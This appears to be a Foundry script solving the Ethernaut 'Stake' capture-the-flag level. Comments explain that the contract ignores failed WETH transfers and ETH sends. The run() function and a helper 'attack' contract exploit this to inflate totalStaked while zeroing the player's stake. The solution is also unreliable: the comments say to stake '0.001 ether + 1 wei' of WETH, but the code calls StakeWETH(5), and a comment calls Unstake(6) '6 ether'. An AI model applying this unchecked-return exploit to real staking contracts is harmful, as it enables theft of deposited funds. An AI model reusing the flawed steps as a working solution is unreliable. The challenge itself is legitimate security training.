// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Stake} from "../src/Stake.sol";


// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Stake.s.sol --tc StakeSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract StakeSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = vm.envAddress("STAKE_INSTANCE");
    address public myAddress = vm.envAddress("MY_ADDRESS");

    /*
        This challenge uses the OZ ERC20 contract
        If we check the WETH address in sepolia https://sepolia.etherscan.io/address/0xCd8AF4A0F29cF7966C051542905F66F5dca9052f
        its a dummy WETH that probably follows the ERC20 standard. Since it is not verified, we can't see the source code.
        The stake 
        The functions uses function selector as bytes to obscure
        We can use this page to check the function selector: https://www.evm-function-selector.click/

        In StakeWETH function, the selector is 0xdd62ed3e which is : function allowance(address _owner, address _spender) public view returns (uint256 remaining)
        The other selector is 0x23b872dd which is : function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)

        To complete this level, the contract state must meet the following conditions:

        - The `Stake` contract's ETH balance has to be greater than 0.
        - `totalStaked` must be greater than the `Stake` contract's ETH balance.
        - You must be a staker.
        - Your staked balance must be 0.
        
        The initial contract balance is 0

        The vulnerability in the contract is that the StakeWETH function does not check the return value of the transfer function.
        This means that if the transfer function fails, the contract will still update the totalStaked and UserStake balances.
        It neither checks the return value of the Unstake function. When sending the funds back to the user, it does not check if the transfer was successful.

        We can stake 0.001 ether + 1 wei to pass the require in the StakeETH function, this will make us a staker.
        And make the contract with balance greater than 0.
        We need to fisrt approve the Stake contract to spend our WETH.
        Then we can call the StakeWETH function with 0.001 ether + 1 wei to pass the require
        Notice that in order to make our balance 0 while the totalStaked is greater than the contract balance
        We will need another account or smart contract to stake into the contract to add up the totalStaked
        In this case we can stake WETH from the other account to make the totalStaked greater than the contract balance
        
        Notice that we can unstake 0.001 ether to leave the contract with 1 wei of balance.
        And then call unstake with the rest of the UserStake balance to make the UserStake balance 0


    */

    address public dummyWETH = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        Stake stakeInstance = Stake(instance);
        // approve the Stake contract to spend our WETH
        // 1 ether is more than enough
        IWETH(dummyWETH).approve(instance, 1 ether);

        // stake 0.001 ether + 1 wei to be a staker
        stakeInstance.StakeETH{value: 0.001 ether + 1 wei}();

        // unstake to withdraw the 0.001 ether
        stakeInstance.Unstake(0.001 ether);

        stakeInstance.StakeWETH(5);
        // This will try to send 6 ether to us which will return false but the contract will still update the totalStaked and UserStake balances to 0
        stakeInstance.Unstake(6);

        // Now the contract will have 1 wei of balance

        // We just need another account to stake WETH to make the totalStaked greater than the contract balance
        attack attackContract = new attack(instance);


        uint256 contractEthBalance = address(instance).balance;
        require(contractEthBalance > 0, "Contract balance must be greater than 0");
        uint256 totalStaked = stakeInstance.totalStaked();
        require(totalStaked > contractEthBalance, "Total staked must be greater than contract balance");
        require(stakeInstance.Stakers(myAddress), "You must be a staker");
        require(stakeInstance.UserStake(myAddress) == 0, "Your staked balance must be 0");
        vm.stopBroadcast();
    }
}

contract attack {
    constructor(address stakeAddress) {
        Stake stakeInstance = Stake(stakeAddress);
        // approve the Stake contract to spend our WETH
        // 1 ether is more than enough
        address dummyWETH = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;
        IWETH(dummyWETH).approve(stakeAddress, 1 ether);

        stakeInstance.StakeWETH(1 ether);
    }

}